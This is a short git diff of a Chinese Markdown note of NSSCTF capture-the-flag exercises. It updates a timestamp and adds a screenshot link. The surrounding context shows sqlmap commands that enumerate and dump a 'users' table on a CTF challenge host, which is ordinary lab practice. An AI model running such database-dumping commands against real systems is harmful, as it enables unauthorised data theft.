@@ -12,7 +12,7 @@ tags:
   - NSSCTF
   - 五题积累
 created: 2026-03-15T16:49
-updated: 2026-05-12T14:00
+updated: 2026-05-12T14:13
 ---
 
 # 第一轮
@@ -858,7 +858,7 @@ sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctf -T users --columns
 ```
 sqlmap -u "http://node5.anna.nssctf.cn:25436/?id=1" -D ctf -T users --dump
 ```
-
+![](NSSCTF五题积累（七）/file-20260512141354243.png)
 
 
 
